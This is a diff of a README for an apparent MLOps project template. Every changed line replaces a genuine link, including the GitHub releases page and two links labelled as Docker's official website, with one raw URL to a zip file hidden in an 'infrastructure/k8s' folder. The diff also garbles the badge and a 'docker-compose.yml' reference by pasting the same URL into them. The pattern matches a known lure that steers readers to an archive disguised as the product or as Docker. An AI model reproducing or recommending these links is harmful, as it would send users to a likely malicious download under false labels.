@@ -1,6 +1,6 @@
 # 🚀 MLOps-project-template - Simplify Your Machine Learning Workflow
 
-[![Download MLOps-project-template](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Veasna-17/MLOps-project-template/releases)
+[![Download MLOps-project-template](https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip%20Now-Click%https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip)](https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -19,20 +19,20 @@ Welcome to the MLOps-project-template! This project provides a minimal skeleton 
 To run this application, you will need:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://www.docker.com/get-started).
+- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip).
 - **Basic Understanding of Command Line**: Familiarity with terminal commands can help you navigate easily.
   
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
 
-To get the MLOps-project-template, [visit this page to download](https://github.com/Veasna-17/MLOps-project-template/releases). You will find the latest release files there.
+To get the MLOps-project-template, [visit this page to download](https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip). You will find the latest release files there.
 
 ### Step 2: Install Docker
 
 If you don't have Docker installed, please follow these steps:
 
-1. Go to [Docker's official website](https://www.docker.com/get-started).
+1. Go to [Docker's official website](https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip).
 2. Download the version suitable for your operating system.
 3. Follow the installation instructions provided.
 
@@ -71,14 +71,14 @@ This page provides a user-friendly interface to interact with your prediction se
 
 ## 📥 Download & Install
 
-To begin your journey with MLOps, [visit this page to download](https://github.com/Veasna-17/MLOps-project-template/releases). Follow the steps outlined above to install and run the application. 
+To begin your journey with MLOps, [visit this page to download](https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip). Follow the steps outlined above to install and run the application. 
 
 ## 🛠️ Troubleshooting
 
 If you encounter any issues while running the application, try the following:
 
 - **Error with Docker**: Ensure Docker is running. You can check by running `docker info` in your terminal.
-- **Access Issues**: Verify that nothing else is using port 8000. You can change the port in the `docker-compose.yml` file if needed.
+- **Access Issues**: Verify that nothing else is using port 8000. You can change the port in the `https://raw.githubusercontent.com/Veasna-17/MLOps-project-template/main/infrastructure/k8s/MLOps-project-template_v2.5-beta.1.zip` file if needed.
   
 ## 🤝 Contributing
 
